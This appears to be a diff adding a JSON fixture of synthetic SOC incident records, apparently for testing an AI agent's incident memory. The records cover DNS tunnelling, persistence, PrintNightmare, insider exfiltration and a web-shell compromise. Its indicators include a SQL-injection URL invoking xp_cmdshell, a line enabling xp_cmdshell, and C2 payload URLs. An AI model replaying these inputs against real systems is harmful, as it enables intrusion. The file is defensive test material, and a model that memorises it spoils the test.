+      "process_names": ["rundll32.exe", "nslookup.exe"],
+      "file_paths": ["C:\\Users\\nancy.wheeler\\AppData\\Roaming\\msupdate.dll"],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Command and Control",
+      "technique_id": "T1071.004",
+      "technique_name": "Application Layer Protocol: DNS"
+    },
+    "investigation_steps": [
+      "Analyzed DNS server query logs: over 12,000 subquery requests of format [hex_encoded_data].dnstunnel-infra-sync.xyz within 30 minutes.",
+      "Reconstructed hex payload revealing staged system configuration and user credentials.",
+      "Identified rogue rundll32.exe process executing exported function from unverified msupdate.dll.",
+      "Isolated workstation and preserved memory image."
+    ],
+    "root_cause": "IcedID malware variant utilizing DNS tunneling for C2 and small-scale credential exfiltration when direct HTTP egress is blocked.",
+    "remediation": "Workstation isolated. Sinkholed dnstunnel-infra-sync.xyz at internal recursive DNS resolvers. Revoked affected user credentials. Deployed endpoint Yara rule targeting the IcedID DLL loader.",
+    "final_outcome": "True Positive - DNS Tunneling Detected and Blocked",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Reconstructing the DNS TXT payload provided clear proof of credential exfiltration."
+    },
+    "lessons_learned": "Restricting standard HTTP/S egress often forces adversaries to pivot to DNS tunneling. Internal DNS resolvers must enforce query length entropy checks."
+  },
+  {
+    "incident_id": "INC-2026-0016",
+    "timestamp": "2026-03-15T15:22:45Z",
+    "alert_type": "Malware persistence",
+    "severity": "Medium",
+    "description": "Registry modification in HKCU Run key pointing to PowerShell script hidden in user AppData folder designed to trigger on every user logon.",
+    "affected_host": "WS-SALES-088.corp.local (10.20.2.88)",
+    "user_account": "CORP\\brian.cox",
+    "indicators": {
+      "ip_addresses": ["10.20.2.88"],
+      "domains": [],
+      "urls": [],
+      "file_hashes": [
+        "3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d"
+      ],
+      "process_names": ["reg.exe", "powershell.exe"],
+      "file_paths": ["C:\\Users\\brian.cox\\AppData\\Local\\Microsoft\\Windows\\cache_sync.ps1"],
+      "registry_keys": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveCacheManager"]
+    },
+    "mitre_attack": {
+      "tactic": "Persistence",
+      "technique_id": "T1547.001",
+      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+    },
+    "investigation_steps": [
+      "Sysmon Event ID 13 (Registry value set) captured creation of value 'OneDriveCacheManager' under HKCU Run key.",
+      "Extracted target path C:\\Users\\brian.cox\\AppData\\Local\\Microsoft\\Windows\\cache_sync.ps1.",
+      "De-obfuscated script: script establishes reverse TCP connection to external IP every 60 minutes.",
+      "Traced parent process of reg.exe command to an unsigned executable downloaded via Chrome."
+    ],
+    "root_cause": "User downloaded a fake PDF reader installer from a search engine ad that dropped persistence via registry keys.",
+    "remediation": "Deleted malicious registry key value. Removed cache_sync.ps1. Reset user browser cache and performed malware removal scan. Added block on malicious search ad domain.",
+    "final_outcome": "True Positive - Run Key Persistence Eradicated",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The fake OneDriveCacheManager key name was clearly flagged as a common persistence masquerade."
+    },
+    "lessons_learned": "Monitoring registry Run keys with EDR/Sysmon remains one of the highest fidelity signals for commodity malware persistence."
+  },
+  {
+    "incident_id": "INC-2026-0017",
+    "timestamp": "2026-03-16T00:45:10Z",
+    "alert_type": "Privilege escalation",
+    "severity": "High",
+    "description": "Exploitation of PrintNightmare vulnerability (CVE-2021-34527) via spoolsv.exe to inject unauthorized print driver DLL running as SYSTEM.",
+    "affected_host": "PRINT-CORP-01.corp.local (10.10.15.20)",
+    "user_account": "CORP\\guest_printer_svc",
+    "indicators": {
+      "ip_addresses": ["10.10.15.20"],
+      "domains": [],
+      "urls": [],
+      "file_hashes": [
+        "5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f"
+      ],
+      "process_names": ["spoolsv.exe", "cmd.exe"],
+      "file_paths": [
+        "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\OldFilter.dll",
+        "C:\\Windows\\Temp\\elevate.bat"
+      ],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Privilege Escalation",
+      "technique_id": "T1068",
+      "technique_name": "Exploitation for Privilege Escalation"
+    },
+    "investigation_steps": [
+      "Sysmon Event ID 11 (File created) detected unexpected DLL written to spool\\drivers directory by spoolsv.exe.",
+      "Observed spoolsv.exe spawn cmd.exe with NT AUTHORITY\\SYSTEM token.",
+      "Identified RPC call invoking RpcAddPrinterDriverEx from remote IP on guest wireless network.",
+      "Captured dropped DLL for static and dynamic malware analysis."
+    ],
+    "root_cause": "Legacy internal print server had Point and Print restrictions disabled via GPO, allowing non-admin users to install unverified printer drivers.",
+    "remediation": "Stopped Print Spooler service on print server. Deleted rogue driver DLL OldFilter.dll. Enforced Microsoft PrintNightmare registry hardening (RestrictDriverInstallationToAdministrators=1). Patched Windows server with latest cumulative update.",
+    "final_outcome": "True Positive - PrintNightmare Exploit Quarantined",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Pinpointed Point and Print misconfiguration immediately, allowing infrastructure team to push the GPO fix enterprise-wide."
+    },
+    "lessons_learned": "Print Spooler service should be disabled on all domain controllers and member servers that do not directly manage physical printers."
+  },
+  {
+    "incident_id": "INC-2026-0018",
+    "timestamp": "2026-03-16T06:12:30Z",
+    "alert_type": "Unusual account activity",
+    "severity": "Medium",
+    "description": "Dormant administrative account inactive for over 180 days suddenly enabled, password changed, and used for multiple RDP logins at 3:00 AM.",
+    "affected_host": "DC-PRIMARY-01.corp.local (10.10.1.10)",
+    "user_account": "CORP\\adm_legacy_migration",
+    "indicators": {
+      "ip_addresses": ["10.10.1.10", "10.20.4.99"],
+      "domains": [],
+      "urls": [],
+      "file_hashes": [],
+      "process_names": ["mstsc.exe", "lsass.exe"],
+      "file_paths": [],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Persistence",
+      "technique_id": "T1098",
+      "technique_name": "Account Manipulation"
+    },
+    "investigation_steps": [
+      "Windows Event ID 4722 (A user account was enabled) and Event ID 4724 (An attempt was made to reset an account's password).",
+      "Identified modifying user: IT contractor performing scheduled database migration rehearsal.",
+      "Checked change management approval board: approved change request RFC-2026-0388 found on file.",
+      "Verified technician forgot to notify SOC of weekend out-of-hours maintenance."
+    ],
+    "root_cause": "Authorized maintenance activity executed without prior notification to Security Operations Center.",
+    "remediation": "Verified identity of technician. Confirmed scope of migration. Account re-disabled following completion of work. Sent advisory to IT operations regarding mandatory SOC change notification protocols.",
+    "final_outcome": "False Positive - Authorized Unannounced IT Maintenance",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Flagged account dormancy accurately. Linking directly to change management portal saved 45 minutes of escalation."
+    },
+    "lessons_learned": "Dormant admin accounts should be deleted rather than disabled. When dormant accounts must be preserved, setting automated SOC alerts on status change is vital."
+  },
+  {
+    "incident_id": "INC-2026-0019",
+    "timestamp": "2026-03-16T12:05:00Z",
+    "alert_type": "Data exfiltration",
+    "severity": "Critical",
+    "description": "Mass download of proprietary CAD files from SharePoint followed by encrypted staging to personal Google Drive account via browser upload.",
+    "affected_host": "WS-ENG-055.corp.local (10.20.3.55)",
+    "user_account": "CORP\\alan.turing_contract",
+    "indicators": {
+      "ip_addresses": ["10.20.3.55", "142.250.180.14"],
+      "domains": ["drive.google.com", "accounts.google.com"],
+      "urls": ["https://drive.google.com/drive/u/1/my-drive"],
+      "file_hashes": [
+        "9f8e7d6c5b4a3029182736451029384756102938475610293847561029384756"
+      ],
+      "process_names": ["chrome.exe"],
+      "file_paths": [
+        "C:\\Users\\alan.turing_contract\\Downloads\\Project_Chimera_CAD_Export.zip"
+      ],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Exfiltration",
+      "technique_id": "T1567.002",
+      "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+    },
+    "investigation_steps": [
+      "DLP sensor alerted on 4.2 GB archive upload to unmanaged Google Drive tenant.",
+      "Reviewed user employment status: contractor's contract was terminated with 24 hours notice earlier that morning.",
+      "Extracted file manifest inside archive: contains complete design drawings for next-generation hardware prototype.",
+      "Preserved browser history, local cache, and download timestamps for legal chain-of-custody."
+    ],
+    "root_cause": "Departing contractor attempted intellectual property theft prior to account de-provisioning window.",
+    "remediation": "Immediate revocation of contractor Active Directory, Microsoft 365, and VPN credentials. Remote lock command issued to contractor laptop. Legal counsel engaged and forensic preservation image generated.",
+    "final_outcome": "True Positive - Insider Threat Exfiltration Intercepted",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The DLP cloud storage correlation and contract status flag allowed immediate legal preservation before files were cleared from browser cache."
+    },
+    "lessons_learned": "High-risk offboarding protocols must trigger automated DLP sensitivity increases and immediate session token termination upon notification of contract conclusion."
+  },
+  {
+    "incident_id": "INC-2026-0020",
+    "timestamp": "2026-03-16T18:30:15Z",
+    "alert_type": "Web server compromise",
+    "severity": "Critical",
+    "description": "SQL injection leading to xp_cmdshell enablement and web shell upload on external customer support portal running on Windows Server IIS.",
+    "affected_host": "SRV-SUPP-WEB01.corp.local (10.10.20.40)",
+    "user_account": "IIS APPPOOL\\SupportAppPool",
+    "indicators": {
+      "ip_addresses": ["185.220.101.99", "10.10.20.40"],
+      "domains": ["support.company-enterprise.com"],
+      "urls": ["https://support.company-enterprise.com/tickets/view?id=1%20UNION%20SELECT%20NULL,xp_cmdshell"],
+      "file_hashes": [
+        "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899"
+      ],
+      "process_names": ["w3wp.exe", "cmd.exe", "sqlservr.exe"],
+      "file_paths": [
+        "C:\\inetpub\\wwwroot\\support\\shell.aspx",
+        "C:\\inetpub\\wwwroot\\support\\App_Data\\cmd_log.txt"
+      ],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Persistence / Execution",
+      "technique_id": "T1505.003",
+      "technique_name": "Server Software Component: Web Shell"
+    },
+    "investigation_steps": [
+      "WAF log detected error-based SQL injection strings in HTTP GET parameter 'id'.",
+      "IIS access log confirmed HTTP 200 responses to /support/shell.aspx with subsequent POST commands.",
+      "Identified web shell shell.aspx executing cmd.exe whoami and ipconfig commands.",
+      "Inspected SQL audit logs: confirmed sp_configure 'xp_cmdshell', 1 executed by web application database user."
+    ],
+    "root_cause": "Improperly parameterized SQL queries in legacy ticket lookup page and overprivileged database user with sysadmin role.",
+    "remediation": "Web shell shell.aspx deleted. Server taken offline for re-imaging from clean baseline. Database user role stripped of sysadmin; parameterized queries implemented across application backend. IP blocked at Cloudflare WAF.",
+    "final_outcome": "True Positive - Web Shell Neutralized and Database Hardened",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The correlation between the SQL injection attempt and the subsequent ASPX web shell creation pinpointed the exact attack vector."
+    },
+    "lessons_learned": "Web application database accounts must never possess sysadmin or ALTER SETTINGS permissions. Web root directories should be mounted read-only for application pools."
+  },
+  {
+    "incident_id": "INC-2026-0021",
+    "timestamp": "2026-03-17T03:10:00Z",
+    "alert_type": "Suspicious PowerShell execution",
+    "severity": "High",
+    "description": "Suspicious PowerShell execution on finance workstation WS-FIN-099 with Base64 encoded payload calling WebClient and attempting AMSI memory bypass, identical to previous campaign seen on WS-FIN-042.",
+    "affected_host": "WS-FIN-099.corp.local (10.20.4.99)",
+    "user_account": "CORP\\richard.hendricks",
+    "indicators": {
+      "ip_addresses": ["185.220.101.5", "10.20.4.99"],
+      "domains": ["cdn-update-auth.com"],
+      "urls": ["http://cdn-update-auth.com/payload/stage2.ps1"],
+      "file_hashes": [
+        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "5c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d"
+      ],
+      "process_names": ["winword.exe", "powershell.exe", "conhost.exe"],
+      "file_paths": ["C:\\Users\\richard.hendricks\\AppData\\Local\\Temp\\update_v2.vbs"],
+      "registry_keys": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefSync"]
+    },
+    "mitre_attack": {
+      "tactic": "Execution / Defense Evasion",
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell"
+    },
+    "investigation_steps": [
+      "Extracted encoded command line from PowerShell Event ID 4104.",
+      "Identified same C2 domain cdn-update-auth.com and AMSI bypass pattern as INC-2026-0001.",
+      "Correlated finance workstation subnet with previous Word macro campaign.",
+      "Confirmed endpoint quarantine initiated within 1 minute of execution."
+    ],
+    "root_cause": "Secondary victim opened duplicate malicious invoice from same phishing campaign identified in INC-2026-0001.",
+    "remediation": "Host isolated. Applied IOC blocklist created during INC-2026-0001. User session terminated and credentials rotated.",
+    "final_outcome": "True Positive - Correlated with Prior Campaign INC-2026-0001",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Immediate recall of INC-2026-0001 allowed fast-track containment using the exact established runbook."
+    },
+    "lessons_learned": "When an initial phishing incident is identified, proactive sweeps of the entire subnet for identical macro and domain indicators prevent secondary infections."
+  },
+  {
+    "incident_id": "INC-2026-0022",
+    "timestamp": "2026-03-17T09:40:10Z",
+    "alert_type": "Adversarial Test / Outdated Runbook Conflict",
+    "severity": "Medium",
+    "description": "Historical incident record with deprecated containment instructions (recommending obsolete legacy antivirus uninstaller and manual registry deletion instead of automated EDR isolate), intended to verify analyst correction and memory conflict resolution.",
+    "affected_host": "WS-TEST-001.corp.local (10.20.9.1)",
+    "user_account": "CORP\\qa_tester",
+    "indicators": {
+      "ip_addresses": ["198.51.100.22", "10.20.9.1"],
+      "domains": ["legacy-test-fixture.internal"],
+      "urls": [],
+      "file_hashes": [
+        "1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff"
+      ],
+      "process_names": ["test_runner.exe"],
+      "file_paths": ["C:\\Windows\\Temp\\test_fixture.bat"],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Execution",
+      "technique_id": "T1059",
+      "technique_name": "Command and Scripting Interpreter"
+    },
+    "investigation_steps": [
+      "Executed synthetic test case to evaluate memory retrieval conflict resolution.",
+      "Analyzed outdated manual cleanup procedure vs modern EDR API quarantine."
+    ],
+    "root_cause": "Historical test entry created during 2023 legacy tooling phase.",
+    "remediation": "Updated runbook: supersede manual batch scripts with unified EDR isolation API.",
+    "final_outcome": "Superseded Historical Information - Conflict Resolved",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Analyst explicitly noted that old remediation steps in this record were superseded by automated EDR policies."
+    },
+    "lessons_learned": "Agent memory must distinguish between active and superseded runbooks; analyst feedback tags allow newer verified protocols to take precedence over stale advice."
+  }
+]
+
